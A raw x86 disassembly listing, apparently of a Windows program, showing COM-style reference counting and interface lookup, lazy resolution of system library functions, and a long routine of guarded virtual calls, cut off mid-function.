  405ca0:	je     0x405ca9
  405ca2:	call   0x405a5b
  405ca7:	jmp    0x405cc3
  405ca9:	push   edi
  405caa:	call   0x405f0b
  405caf:	mov    edi,eax
  405cb1:	test   edi,edi
  405cb3:	je     0x405cc2
  405cb5:	push   DWORD PTR [esi+0x4]
  405cb8:	mov    ecx,edi
  405cba:	call   DWORD PTR ds:0x409254
  405cc0:	call   edi
  405cc2:	pop    edi
  405cc3:	push   esi
  405cc4:	push   0x0
  405cc6:	call   DWORD PTR ds:0x40914c
  405ccc:	push   eax
  405ccd:	call   DWORD PTR ds:0x40913c
  405cd3:	mov    ecx,DWORD PTR [ebp-0x4]
  405cd6:	xor    ecx,ebp
  405cd8:	pop    esi
  405cd9:	call   0x4071f0
  405cde:	mov    esp,ebp
  405ce0:	pop    ebp
  405ce1:	ret    0x4
  405ce4:	int3   
  405ce5:	int3   
  405ce6:	int3   
  405ce7:	int3   
  405ce8:	int3   
  405ce9:	mov    edi,edi
  405ceb:	push   ebp
  405cec:	mov    ebp,esp
  405cee:	push   ecx
  405cef:	cmp    BYTE PTR ds:0x4084a4,0x0
  405cf6:	je     0x405d09
  405cf8:	push   DWORD PTR ds:0x4084ac
  405cfe:	call   DWORD PTR ds:0x4091b8
  405d04:	jmp    0x405d96
  405d09:	push   esi
  405d0a:	push   0x800
  405d0f:	push   0x0
  405d11:	push   0x4017d4
  405d16:	call   DWORD PTR ds:0x409168
  405d1c:	mov    esi,eax
  405d1e:	test   esi,esi
  405d20:	je     0x405d93
  405d22:	push   0x4084a8
  405d27:	mov    edx,0x4017e4
  405d2c:	mov    ecx,esi
  405d2e:	call   0x405aeb
  405d33:	test   al,al
  405d35:	je     0x405d93
  405d37:	push   0x4084b4
  405d3c:	mov    edx,0x4017fc
  405d41:	mov    ecx,esi
  405d43:	call   0x405aeb
  405d48:	test   al,al
  405d4a:	je     0x405d93
  405d4c:	push   0x4084ac
  405d51:	mov    edx,0x401810
  405d56:	mov    ecx,esi
  405d58:	call   0x405aeb
  405d5d:	test   al,al
  405d5f:	je     0x405d93
  405d61:	push   0x4084b0
  405d66:	mov    edx,0x401824
  405d6b:	mov    ecx,esi
  405d6d:	call   0x405aeb
  405d72:	test   al,al
  405d74:	je     0x405d93
  405d76:	xor    ecx,ecx
  405d78:	lea    eax,[ebp-0x4]
  405d7b:	lock or DWORD PTR [eax],ecx
  405d7e:	push   DWORD PTR ds:0x4084ac
  405d84:	mov    BYTE PTR ds:0x4084a4,0x1
  405d8b:	call   DWORD PTR ds:0x4091b8
  405d91:	jmp    0x405d95
  405d93:	xor    eax,eax
  405d95:	pop    esi
  405d96:	mov    esp,ebp
  405d98:	pop    ebp
  405d99:	ret    
  405d9a:	int3   
  405d9b:	int3   
  405d9c:	int3   
  405d9d:	int3   
  405d9e:	int3   
  405d9f:	mov    edi,edi
  405da1:	push   ebp
  405da2:	mov    ebp,esp
  405da4:	push   ecx
  405da5:	cmp    BYTE PTR ds:0x4084a4,0x0
  405dac:	je     0x405dbf
  405dae:	push   DWORD PTR ds:0x4084a8
  405db4:	call   DWORD PTR ds:0x4091b8
  405dba:	jmp    0x405e4c
  405dbf:	push   esi
  405dc0:	push   0x800
  405dc5:	push   0x0
  405dc7:	push   0x4017d4
  405dcc:	call   DWORD PTR ds:0x409168
  405dd2:	mov    esi,eax
  405dd4:	test   esi,esi
  405dd6:	je     0x405e49
  405dd8:	push   0x4084a8
  405ddd:	mov    edx,0x4017e4
  405de2:	mov    ecx,esi
  405de4:	call   0x405aeb
  405de9:	test   al,al
  405deb:	je     0x405e49
  405ded:	push   0x4084b4
  405df2:	mov    edx,0x4017fc
  405df7:	mov    ecx,esi
  405df9:	call   0x405aeb
  405dfe:	test   al,al
  405e00:	je     0x405e49
  405e02:	push   0x4084ac
  405e07:	mov    edx,0x401810
  405e0c:	mov    ecx,esi
  405e0e:	call   0x405aeb
  405e13:	test   al,al
  405e15:	je     0x405e49
  405e17:	push   0x4084b0
  405e1c:	mov    edx,0x401824
  405e21:	mov    ecx,esi
  405e23:	call   0x405aeb
  405e28:	test   al,al
  405e2a:	je     0x405e49
  405e2c:	xor    ecx,ecx
  405e2e:	lea    eax,[ebp-0x4]
  405e31:	lock or DWORD PTR [eax],ecx
  405e34:	push   DWORD PTR ds:0x4084a8
  405e3a:	mov    BYTE PTR ds:0x4084a4,0x1
  405e41:	call   DWORD PTR ds:0x4091b8
  405e47:	jmp    0x405e4b
  405e49:	xor    eax,eax
  405e4b:	pop    esi
  405e4c:	mov    esp,ebp
  405e4e:	pop    ebp
  405e4f:	ret    
  405e50:	int3   
  405e51:	int3   
  405e52:	int3   
  405e53:	int3   
  405e54:	int3   
  405e55:	mov    edi,edi
  405e57:	push   ebp
  405e58:	mov    ebp,esp
  405e5a:	push   ecx
  405e5b:	cmp    BYTE PTR ds:0x4084a4,0x0
  405e62:	je     0x405e75
  405e64:	push   DWORD PTR ds:0x4084b4
  405e6a:	call   DWORD PTR ds:0x4091b8
  405e70:	jmp    0x405f02
  405e75:	push   esi
  405e76:	push   0x800
  405e7b:	push   0x0
  405e7d:	push   0x4017d4
  405e82:	call   DWORD PTR ds:0x409168
  405e88:	mov    esi,eax
  405e8a:	test   esi,esi
  405e8c:	je     0x405eff
  405e8e:	push   0x4084a8
  405e93:	mov    edx,0x4017e4
  405e98:	mov    ecx,esi
  405e9a:	call   0x405aeb
  405e9f:	test   al,al
  405ea1:	je     0x405eff
  405ea3:	push   0x4084b4
  405ea8:	mov    edx,0x4017fc
  405ead:	mov    ecx,esi
  405eaf:	call   0x405aeb
  405eb4:	test   al,al
  405eb6:	je     0x405eff
  405eb8:	push   0x4084ac
  405ebd:	mov    edx,0x401810
  405ec2:	mov    ecx,esi
  405ec4:	call   0x405aeb
  405ec9:	test   al,al
  405ecb:	je     0x405eff
  405ecd:	push   0x4084b0
  405ed2:	mov    edx,0x401824
  405ed7:	mov    ecx,esi
  405ed9:	call   0x405aeb
  405ede:	test   al,al
  405ee0:	je     0x405eff
  405ee2:	xor    ecx,ecx
  405ee4:	lea    eax,[ebp-0x4]
  405ee7:	lock or DWORD PTR [eax],ecx
  405eea:	push   DWORD PTR ds:0x4084b4
  405ef0:	mov    BYTE PTR ds:0x4084a4,0x1
  405ef7:	call   DWORD PTR ds:0x4091b8
  405efd:	jmp    0x405f01
  405eff:	xor    eax,eax
  405f01:	pop    esi
  405f02:	mov    esp,ebp
  405f04:	pop    ebp
  405f05:	ret    
  405f06:	int3   
  405f07:	int3   
  405f08:	int3   
  405f09:	int3   
  405f0a:	int3   
  405f0b:	mov    edi,edi
  405f0d:	push   ebp
  405f0e:	mov    ebp,esp
  405f10:	push   ecx
  405f11:	cmp    BYTE PTR ds:0x4084a4,0x0
  405f18:	je     0x405f2b
  405f1a:	push   DWORD PTR ds:0x4084b0
  405f20:	call   DWORD PTR ds:0x4091b8
  405f26:	jmp    0x405fb8
  405f2b:	push   esi
  405f2c:	push   0x800
  405f31:	push   0x0
  405f33:	push   0x4017d4
  405f38:	call   DWORD PTR ds:0x409168
  405f3e:	mov    esi,eax
  405f40:	test   esi,esi
  405f42:	je     0x405fb5
  405f44:	push   0x4084a8
  405f49:	mov    edx,0x4017e4
  405f4e:	mov    ecx,esi
  405f50:	call   0x405aeb
  405f55:	test   al,al
  405f57:	je     0x405fb5
  405f59:	push   0x4084b4
  405f5e:	mov    edx,0x4017fc
  405f63:	mov    ecx,esi
  405f65:	call   0x405aeb
  405f6a:	test   al,al
  405f6c:	je     0x405fb5
  405f6e:	push   0x4084ac
  405f73:	mov    edx,0x401810
  405f78:	mov    ecx,esi
  405f7a:	call   0x405aeb
  405f7f:	test   al,al
  405f81:	je     0x405fb5
  405f83:	push   0x4084b0
  405f88:	mov    edx,0x401824
  405f8d:	mov    ecx,esi
  405f8f:	call   0x405aeb
  405f94:	test   al,al
  405f96:	je     0x405fb5
  405f98:	xor    ecx,ecx
  405f9a:	lea    eax,[ebp-0x4]
  405f9d:	lock or DWORD PTR [eax],ecx
  405fa0:	push   DWORD PTR ds:0x4084b0
  405fa6:	mov    BYTE PTR ds:0x4084a4,0x1
  405fad:	call   DWORD PTR ds:0x4091b8
  405fb3:	jmp    0x405fb7
  405fb5:	xor    eax,eax
  405fb7:	pop    esi
  405fb8:	mov    esp,ebp
  405fba:	pop    ebp
  405fbb:	ret    
  405fbc:	int3   
  405fbd:	int3   
  405fbe:	int3   
  405fbf:	int3   
  405fc0:	int3   
  405fc1:	int3   
  405fc2:	int3   
  405fc3:	int3   
  405fc4:	int3   
  405fc5:	int3   
  405fc6:	int3   
  405fc7:	int3   
  405fc8:	int3   
  405fc9:	int3   
  405fca:	int3   
  405fcb:	int3   
  405fcc:	int3   
  405fcd:	int3   
  405fce:	int3   
  405fcf:	int3   
  405fd0:	mov    edi,edi
  405fd2:	push   ebp
  405fd3:	mov    ebp,esp
  405fd5:	push   ebx
  405fd6:	push   esi
  405fd7:	mov    esi,DWORD PTR [ebp+0xc]
  405fda:	xor    edx,edx
  405fdc:	push   edi
  405fdd:	push   0x4
  405fdf:	mov    ebx,0x4018a0
  405fe4:	mov    ecx,edx
  405fe6:	pop    edi
  405fe7:	mov    eax,DWORD PTR [esi+ecx*4]
  405fea:	cmp    eax,DWORD PTR [ebx+ecx*4]
  405fed:	jne    0x405ff6
  405fef:	inc    ecx
  405ff0:	cmp    ecx,edi
  405ff2:	jne    0x405fe7
  405ff4:	jmp    0x40600a
  405ff6:	mov    ebx,0x4018f0
  405ffb:	mov    ecx,edx
  405ffd:	mov    eax,DWORD PTR [esi+ecx*4]
  406000:	cmp    eax,DWORD PTR [ebx+ecx*4]
  406003:	jne    0x406014
  406005:	inc    ecx
  406006:	cmp    ecx,edi
  406008:	jne    0x405ffd
  40600a:	mov    eax,DWORD PTR [ebp+0x10]
  40600d:	mov    ecx,DWORD PTR [ebp+0x8]
  406010:	mov    DWORD PTR [eax],ecx
  406012:	jmp    0x406077
  406014:	mov    ebx,0x4018e0
  406019:	mov    ecx,edx
  40601b:	mov    eax,DWORD PTR [esi+ecx*4]
  40601e:	cmp    eax,DWORD PTR [ebx+ecx*4]
  406021:	jne    0x406034
  406023:	inc    ecx
  406024:	cmp    ecx,edi
  406026:	jne    0x40601b
  406028:	mov    ecx,DWORD PTR [ebp+0x8]
  40602b:	test   ecx,ecx
  40602d:	je     0x406072
  40602f:	lea    edx,[ecx+0x4]
  406032:	jmp    0x406072
  406034:	mov    ebx,0x4018d0
  406039:	mov    ecx,edx
  40603b:	mov    eax,DWORD PTR [esi+ecx*4]
  40603e:	cmp    eax,DWORD PTR [ebx+ecx*4]
  406041:	jne    0x406054
  406043:	inc    ecx
  406044:	cmp    ecx,edi
  406046:	jne    0x40603b
  406048:	mov    ecx,DWORD PTR [ebp+0x8]
  40604b:	test   ecx,ecx
  40604d:	je     0x406072
  40604f:	lea    edx,[ecx+0x8]
  406052:	jmp    0x406072
  406054:	mov    ebx,0x4018c0
  406059:	mov    ecx,edx
  40605b:	mov    eax,DWORD PTR [esi+ecx*4]
  40605e:	cmp    eax,DWORD PTR [ebx+ecx*4]
  406061:	jne    0x40607f
  406063:	inc    ecx
  406064:	cmp    ecx,edi
  406066:	jne    0x40605b
  406068:	mov    ecx,DWORD PTR [ebp+0x8]
  40606b:	test   ecx,ecx
  40606d:	je     0x406072
  40606f:	lea    edx,[ecx+0xc]
  406072:	mov    eax,DWORD PTR [ebp+0x10]
  406075:	mov    DWORD PTR [eax],edx
  406077:	lock inc DWORD PTR [ecx+0x2c]
  40607b:	xor    eax,eax
  40607d:	jmp    0x406089
  40607f:	mov    eax,DWORD PTR [ebp+0x10]
  406082:	mov    DWORD PTR [eax],edx
  406084:	mov    eax,0x80004002
  406089:	pop    edi
  40608a:	pop    esi
  40608b:	pop    ebx
  40608c:	pop    ebp
  40608d:	ret    0xc
  406090:	int3   
  406091:	int3   
  406092:	int3   
  406093:	int3   
  406094:	int3   
  406095:	int3   
  406096:	int3   
  406097:	int3   
  406098:	int3   
  406099:	int3   
  40609a:	int3   
  40609b:	int3   
  40609c:	int3   
  40609d:	int3   
  40609e:	int3   
  40609f:	int3   
  4060a0:	mov    edi,edi
  4060a2:	push   ebp
  4060a3:	mov    ebp,esp
  4060a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4060a8:	xor    eax,eax
  4060aa:	inc    eax
  4060ab:	lock xadd DWORD PTR [ecx+0x2c],eax
  4060b0:	inc    eax
  4060b1:	pop    ebp
  4060b2:	ret    0x4
  4060b5:	int3   
  4060b6:	int3   
  4060b7:	int3   
  4060b8:	int3   
  4060b9:	int3   
  4060ba:	int3   
  4060bb:	int3   
  4060bc:	int3   
  4060bd:	int3   
  4060be:	int3   
  4060bf:	int3   
  4060c0:	mov    edi,edi
  4060c2:	push   ebp
  4060c3:	mov    ebp,esp
  4060c5:	mov    ecx,DWORD PTR [ebp+0x8]
  4060c8:	or     eax,0xffffffff
  4060cb:	lock xadd DWORD PTR [ecx+0x2c],eax
  4060d0:	dec    eax
  4060d1:	pop    ebp
  4060d2:	ret    0x4
  4060d5:	int3   
  4060d6:	int3   
  4060d7:	int3   
  4060d8:	int3   
  4060d9:	int3   
  4060da:	int3   
  4060db:	int3   
  4060dc:	int3   
  4060dd:	int3   
  4060de:	int3   
  4060df:	int3   
  4060e0:	mov    edi,edi
  4060e2:	push   ebp
  4060e3:	mov    ebp,esp
  4060e5:	sub    esp,0x50
  4060e8:	mov    eax,ds:0x408008
  4060ed:	xor    eax,ebp
  4060ef:	mov    DWORD PTR [ebp-0x4],eax
  4060f2:	push   ebx
  4060f3:	mov    ebx,DWORD PTR [ebp+0x8]
  4060f6:	push   esi
  4060f7:	push   edi
  4060f8:	xor    edi,edi
  4060fa:	lea    esi,[ebx+0x30]
  4060fd:	mov    DWORD PTR [ebp-0x1c],edi
  406100:	push   esi
  406101:	mov    DWORD PTR [ebp-0x40],esi
  406104:	call   DWORD PTR ds:0x409028
  40610a:	and    DWORD PTR [ebp-0x30],0xfffffff8
  40610e:	mov    DWORD PTR [ebp-0x10],edi
  406111:	mov    DWORD PTR [ebp-0x14],edi
  406114:	mov    DWORD PTR [ebp-0xc],edi
  406117:	mov    DWORD PTR [ebp-0x3c],edi
  40611a:	mov    DWORD PTR [ebp-0x2c],edi
  40611d:	mov    DWORD PTR [ebp-0x20],edi
  406120:	mov    DWORD PTR [ebp-0x24],edi
  406123:	mov    DWORD PTR [ebp-0x28],edi
  406126:	cmp    DWORD PTR [ebp+0xc],edi
  406129:	je     0x406483
  40612f:	push   DWORD PTR [ebp+0xc]
  406132:	call   DWORD PTR ds:0x409084
  406138:	test   eax,eax
  40613a:	je     0x406483
  406140:	cmp    DWORD PTR [ebp+0x1c],edi
  406143:	je     0x40615d
  406145:	push   DWORD PTR [ebx+0x4c]
  406148:	call   DWORD PTR ds:0x409088
  40614e:	push   DWORD PTR [ebp+0x1c]
  406151:	mov    DWORD PTR [ebx+0x4c],edi
  406154:	call   DWORD PTR ds:0x409094
  40615a:	mov    DWORD PTR [ebx+0x4c],eax
  40615d:	mov    al,BYTE PTR [ebp+0x14]
  406160:	mov    BYTE PTR [ebx+0x48],al
  406163:	add    ebx,0x1c
  406166:	mov    DWORD PTR [ebp-0x8],ebx
  406169:	mov    ecx,DWORD PTR [ebx]
  40616b:	test   ecx,ecx
  40616d:	je     0x406183
  40616f:	mov    eax,DWORD PTR [ecx]
  406171:	push   ecx
  406172:	mov    edi,DWORD PTR [eax+0x8]
  406175:	mov    ecx,edi
  406177:	call   DWORD PTR ds:0x409254
  40617d:	call   edi
  40617f:	xor    edi,edi
  406181:	mov    DWORD PTR [ebx],edi
  406183:	push   ebx
  406184:	push   0x401890
  406189:	push   0x17
  40618b:	push   edi
  40618c:	push   0x4018b0
  406191:	call   DWORD PTR ds:0x409108
  406197:	mov    ebx,eax
  406199:	test   ebx,ebx
  40619b:	js     0x406488
  4061a1:	mov    eax,DWORD PTR [ebp-0x8]
  4061a4:	lea    edx,[ebp-0x10]
  4061a7:	push   edx
  4061a8:	mov    eax,DWORD PTR [eax]
  4061aa:	push   eax
  4061ab:	mov    ecx,DWORD PTR [eax]
  4061ad:	mov    edi,DWORD PTR [ecx+0x30]
  4061b0:	mov    ecx,edi
  4061b2:	call   DWORD PTR ds:0x409254
  4061b8:	call   edi
  4061ba:	mov    ebx,eax
  4061bc:	test   ebx,ebx
  4061be:	js     0x406488
  4061c4:	and    DWORD PTR [ebp-0x28],0x0
  4061c8:	and    DWORD PTR [ebp-0x2c],0x0
  4061cc:	cmp    BYTE PTR [ebp+0x18],0x0
  4061d0:	push   ecx
  4061d1:	lea    ecx,[ebp-0x30]
  4061d4:	je     0x4061dd
  4061d6:	push   0x401838
  4061db:	jmp    0x4061e2
  4061dd:	push   0x401868
  4061e2:	call   0x406c1b
  4061e7:	push   ecx
  4061e8:	push   DWORD PTR [ebp+0xc]
  4061eb:	lea    ecx,[ebp-0x30]
  4061ee:	call   0x406c1b
  4061f3:	push   ecx
  4061f4:	push   0x401880
  4061f9:	lea    ecx,[ebp-0x30]
  4061fc:	call   0x406c1b
  406201:	cmp    DWORD PTR [ebp-0x2c],0x0
  406205:	jge    0x40620b
  406207:	xor    eax,eax
  406209:	jmp    0x40620e
  40620b:	mov    eax,DWORD PTR [ebp-0x20]
  40620e:	push   eax
  40620f:	call   DWORD PTR ds:0x409094
  406215:	mov    ebx,eax
  406217:	mov    DWORD PTR [ebp-0x3c],ebx
  40621a:	test   ebx,ebx
  40621c:	je     0x40647c
  406222:	push   ebx
  406223:	call   DWORD PTR ds:0x409084
  406229:	test   eax,eax
  40622b:	je     0x40647c
  406231:	mov    ecx,DWORD PTR [ebp-0x10]
  406234:	lea    eax,[ebp-0x14]
  406237:	push   eax
  406238:	push   ebx
  406239:	push   ecx
  40623a:	mov    edi,DWORD PTR [ecx]
  40623c:	mov    ecx,DWORD PTR [edi+0x4c]
  40623f:	call   DWORD PTR ds:0x409254
  406245:	call   DWORD PTR [edi+0x4c]
  406248:	mov    ebx,eax
  40624a:	test   ebx,ebx
  40624c:	js     0x406488
  406252:	mov    eax,DWORD PTR [ebp-0x14]
  406255:	mov    edx,DWORD PTR [ebp+0x8]
  406258:	add    edx,0x28
  40625b:	push   edx
  40625c:	mov    ecx,DWORD PTR [eax]
  40625e:	push   eax
  40625f:	mov    DWORD PTR [ebp-0x34],edx
  406262:	mov    edi,DWORD PTR [ecx+0x24]
  406265:	mov    ecx,edi
  406267:	call   DWORD PTR ds:0x409254
  40626d:	call   edi
  40626f:	mov    ebx,eax
  406271:	test   ebx,ebx
  406273:	js     0x406488
  406279:	mov    eax,DWORD PTR [ebp-0x8]
  40627c:	mov    edx,DWORD PTR [ebp+0x8]
  40627f:	add    edx,0x18
  406282:	push   edx
  406283:	mov    ecx,DWORD PTR [eax]
  406285:	push   ecx
  406286:	mov    DWORD PTR [ebp-0x38],edx
  406289:	mov    eax,DWORD PTR [ecx]
  40628b:	mov    edi,DWORD PTR [eax+0x34]
  40628e:	mov    ecx,edi
  406290:	call   DWORD PTR ds:0x409254
  406296:	call   edi
  406298:	mov    ebx,eax
  40629a:	test   ebx,ebx
  40629c:	js     0x406488
  4062a2:	mov    eax,DWORD PTR [ebp-0x8]
  4062a5:	mov    edx,DWORD PTR [ebp+0x8]
  4062a8:	add    edx,0x20
  4062ab:	push   edx
  4062ac:	mov    ecx,DWORD PTR [eax]
  4062ae:	push   ecx
  4062af:	mov    DWORD PTR [ebp-0x18],edx
  4062b2:	mov    eax,DWORD PTR [ecx]
  4062b4:	mov    edi,DWORD PTR [eax+0x38]
  4062b7:	mov    ecx,edi
  4062b9:	call   DWORD PTR ds:0x409254
  4062bf:	call   edi
  4062c1:	mov    ebx,eax
  4062c3:	test   ebx,ebx
  4062c5:	js     0x406488
  4062cb:	mov    eax,DWORD PTR [ebp-0x38]
  4062ce:	mov    edx,DWORD PTR [ebp-0x34]
  4062d1:	mov    ecx,DWORD PTR [eax]
  4062d3:	push   DWORD PTR [edx]
  4062d5:	push   ecx
  4062d6:	mov    eax,DWORD PTR [ecx]
  4062d8:	mov    edi,DWORD PTR [eax+0x38]
  4062db:	mov    ecx,edi
  4062dd:	call   DWORD PTR ds:0x409254
  4062e3:	call   edi
  4062e5:	mov    ebx,eax
  4062e7:	test   ebx,ebx
  4062e9:	js     0x406488
  4062ef:	cmp    DWORD PTR [ebp+0x10],0x0
  4062f3:	jne    0x406400
  4062f9:	mov    eax,DWORD PTR [ebp-0x38]
  4062fc:	lea    edx,[ebp-0x8]
  4062ff:	and    DWORD PTR [ebp-0x8],0x0
  406303:	push   edx
  406304:	mov    eax,DWORD PTR [eax]
  406306:	push   eax
  406307:	mov    ecx,DWORD PTR [eax]
  406309:	mov    edi,DWORD PTR [ecx+0x40]
  40630c:	mov    ecx,edi
  40630e:	call   DWORD PTR ds:0x409254
  406314:	call   edi
  406316:	mov    ebx,eax
  406318:	mov    eax,DWORD PTR [ebp-0x8]
  40631b:	test   ebx,ebx
  40631d:	jns    0x40633c
  40631f:	test   eax,eax
  406321:	je     0x406488
  406327:	mov    ecx,DWORD PTR [eax]
  406329:	push   eax
  40632a:	mov    edi,DWORD PTR [ecx+0x8]
  40632d:	mov    ecx,edi
  40632f:	call   DWORD PTR ds:0x409254
  406335:	call   edi
  406337:	jmp    0x406488
  40633c:	mov    ecx,DWORD PTR [eax]
  40633e:	lea    edx,[ebp-0x1c]
  406341:	push   edx
  406342:	push   eax
  406343:	mov    edi,DWORD PTR [ecx+0x1c]
  406346:	mov    ecx,edi
  406348:	call   DWORD PTR ds:0x409254
  40634e:	call   edi
  406350:	mov    ebx,eax
  406352:	test   ebx,ebx
  406354:	jns    0x40635b
  406356:	mov    eax,DWORD PTR [ebp-0x8]
  406359:	jmp    0x40631f
  40635b:	mov    ebx,DWORD PTR [ebp-0x1c]
  40635e:	test   ebx,ebx
  406360:	js     0x406356
  406362:	mov    ecx,DWORD PTR [ebp-0x18]
  406365:	mov    edx,DWORD PTR [ebp-0x34]
  406368:	mov    ecx,DWORD PTR [ecx]
  40636a:	push   DWORD PTR [edx]
  40636c:	push   ecx
  40636d:	mov    eax,DWORD PTR [ecx]
  40636f:	mov    edi,DWORD PTR [eax+0x40]
  406372:	mov    ecx,edi
  406374:	call   DWORD PTR ds:0x409254
  40637a:	call   edi
  40637c:	mov    ebx,eax
  40637e:	test   ebx,ebx
  406380:	js     0x406356
  406382:	cmp    BYTE PTR [ebp+0x14],0x0
  406386:	mov    eax,DWORD PTR [ebp-0x18]
  406389:	mov    eax,DWORD PTR [eax]
  40638b:	je     0x4063ea
  40638d:	mov    edi,DWORD PTR [eax]
  40638f:	lea    ecx,[ebp-0xc]
  406392:	push   ecx
  406393:	mov    ecx,DWORD PTR [ebp+0x8]
  406396:	push   DWORD PTR [ecx+0x4c]
  406399:	mov    ecx,DWORD PTR [edi+0x58]
  40639c:	push   eax
  40639d:	call   DWORD PTR ds:0x409254
  4063a3:	call   DWORD PTR [edi+0x58]
  4063a6:	mov    ebx,eax
  4063a8:	test   ebx,ebx
  4063aa:	js     0x406356
  4063ac:	mov    eax,DWORD PTR [ebp-0xc]
  4063af:	lea    edx,[ebp-0x1c]
  4063b2:	push   edx
  4063b3:	push   eax
  4063b4:	mov    ecx,DWORD PTR [eax]
  4063b6:	mov    edi,DWORD PTR [ecx+0x1c]
  4063b9:	mov    ecx,edi
  4063bb:	call   DWORD PTR ds:0x409254
  4063c1:	call   edi
  4063c3:	mov    ebx,eax
  4063c5:	test   ebx,ebx
  4063c7:	js     0x406356
  4063c9:	mov    eax,DWORD PTR [ebp-0xc]
  4063cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4063cf:	add    ecx,0x50
  4063d2:	push   ecx
  4063d3:	mov    edx,DWORD PTR [eax]
  4063d5:	push   eax
  4063d6:	mov    edi,DWORD PTR [edx+0x20]
  4063d9:	mov    ecx,edi
  4063db:	call   DWORD PTR ds:0x409254
  4063e1:	call   edi
  4063e3:	mov    ebx,eax
  4063e5:	jmp    0x406356
  4063ea:	mov    ecx,DWORD PTR [eax]
  4063ec:	lea    edx,[ebp-0xc]
  4063ef:	push   edx
  4063f0:	push   eax
  4063f1:	mov    edi,DWORD PTR [ecx+0x54]
  4063f4:	mov    ecx,edi
  4063f6:	call   DWORD PTR ds:0x409254
  4063fc:	call   edi
  4063fe:	jmp    0x4063a6
  406400:	mov    ebx,DWORD PTR [ebp+0x8]
  406403:	lea    edi,[ebx+0x10]
  406406:	mov    ecx,DWORD PTR [edi]
  406408:	test   ecx,ecx
  40640a:	je     0x40641f
  40640c:	mov    eax,DWORD PTR [ecx]
  40640e:	push   ecx
  40640f:	mov    esi,DWORD PTR [eax+0x8]
  406412:	mov    ecx,esi
  406414:	call   DWORD PTR ds:0x409254
  40641a:	call   esi
  40641c:	and    DWORD PTR [edi],0x0
  40641f:	push   DWORD PTR [ebp+0x10]
  406422:	mov    ecx,edi
  406424:	call   0x406ba1
  406429:	push   0xd
  40642b:	lea    edi,[ebx+0x14]
  40642e:	mov    DWORD PTR [ebp-0x48],ebx
  406431:	mov    ecx,DWORD PTR [edi]
  406433:	pop    eax
  406434:	mov    WORD PTR [ebp-0x50],ax
  406438:	test   ecx,ecx
  40643a:	je     0x40644f
  40643c:	mov    eax,DWORD PTR [ecx]
  40643e:	push   ecx
  40643f:	mov    esi,DWORD PTR [eax+0x8]
  406442:	mov    ecx,esi
  406444:	call   DWORD PTR ds:0x409254
  40644a:	call   esi
  40644c:	and    DWORD PTR [edi],0x0
  40644f:	mov    ecx,DWORD PTR [ebx+0x18]
  406452:	lea    esi,[ebp-0x50]
  406455:	push   edi
  406456:	sub    esp,0x10
  406459:	lea    eax,[ebx+0x4]
  40645c:	mov    edi,esp
  40645e:	mov    ebx,DWORD PTR [ecx]
  406460:	push   eax
  406461:	push   DWORD PTR [ebp+0x8]
  406464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406465:	push   ecx
  406466:	mov    ecx,DWORD PTR [ebx+0x3c]
  406469:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40646a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40646b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40646c:	call   DWORD PTR ds:0x409254
  406472:	call   DWORD PTR [ebx+0x3c]
  406475:	mov    esi,DWORD PTR [ebp-0x40]
  406478:	mov    ebx,eax
  40647a:	jmp    0x406488
  40647c:	mov    ebx,0x8007000e
  406481:	jmp    0x406488
  406483:	mov    ebx,0x80070057
  406488:	push   DWORD PTR [ebp-0x3c]
  40648b:	call   DWORD PTR ds:0x409088
  406491:	cmp    DWORD PTR [ebp-0x20],0x0
  406495:	je     0x40649f
  406497:	lea    ecx,[ebp-0x30]
  40649a:	call   0x406d12
  40649f:	mov    eax,DWORD PTR [ebp-0xc]
  4064a2:	test   eax,eax
  4064a4:	je     0x4064b6
  4064a6:	mov    ecx,DWORD PTR [eax]
  4064a8:	push   eax
  4064a9:	mov    edi,DWORD PTR [ecx+0x8]
  4064ac:	mov    ecx,edi
  4064ae:	call   DWORD PTR ds:0x409254
  4064b4:	call   edi
  4064b6:	mov    eax,DWORD PTR [ebp-0x14]
  4064b9:	test   eax,eax
  4064bb:	je     0x4064cd
  4064bd:	mov    ecx,DWORD PTR [eax]
  4064bf:	push   eax
  4064c0:	mov    edi,DWORD PTR [ecx+0x8]
  4064c3:	mov    ecx,edi
  4064c5:	call   DWORD PTR ds:0x409254
  4064cb:	call   edi
  4064cd:	mov    eax,DWORD PTR [ebp-0x10]
  4064d0:	test   eax,eax
  4064d2:	je     0x4064e4
  4064d4:	mov    ecx,DWORD PTR [eax]
  4064d6:	push   eax
  4064d7:	mov    edi,DWORD PTR [ecx+0x8]
  4064da:	mov    ecx,edi
  4064dc:	call   DWORD PTR ds:0x409254
  4064e2:	call   edi
  4064e4:	push   esi
  4064e5:	call   DWORD PTR ds:0x409078
  4064eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4064ee:	mov    eax,ebx
  4064f0:	pop    edi
  4064f1:	pop    esi
  4064f2:	xor    ecx,ebp
  4064f4:	pop    ebx
  4064f5:	call   0x4071f0
  4064fa:	mov    esp,ebp
  4064fc:	pop    ebp
  4064fd:	ret    0x18
  406500:	int3   
  406501:	int3   
  406502:	int3   
  406503:	int3   
  406504:	int3   
  406505:	int3   
  406506:	int3   
  406507:	int3   
  406508:	int3   
  406509:	int3   
  40650a:	int3   
  40650b:	int3   
  40650c:	int3   
  40650d:	int3   
  40650e:	int3   
  40650f:	int3   
  406510:	mov    edi,edi
  406512:	push   ebp
  406513:	mov    ebp,esp
  406515:	sub    esp,0x20
  406518:	mov    eax,ds:0x408008
  40651d:	xor    eax,ebp
  40651f:	mov    DWORD PTR [ebp-0x4],eax
  406522:	push   ebx
  406523:	mov    ebx,DWORD PTR [ebp+0x8]
  406526:	push   esi
  406527:	push   edi
  406528:	lea    eax,[ebx+0x2c]
  40652b:	push   eax
  40652c:	call   DWORD PTR ds:0x409028
  406532:	xor    eax,eax
  406534:	mov    DWORD PTR [ebp-0x10],eax
  406537:	mov    DWORD PTR [ebp-0x8],eax
  40653a:	mov    DWORD PTR [ebp-0xc],eax
  40653d:	cmp    DWORD PTR [ebp+0x10],eax
  406540:	je     0x406728
  406546:	cmp    DWORD PTR [ebp+0xc],eax
  406549:	je     0x406728
  40654f:	cmp    DWORD PTR [ebx+0xc],eax
  406552:	je     0x406728
  406558:	mov    ecx,DWORD PTR [ebx+0x14]
  40655b:	test   ecx,ecx
  40655d:	je     0x406728
  406563:	cmp    DWORD PTR [ebx+0x1c],eax
  406566:	je     0x406728
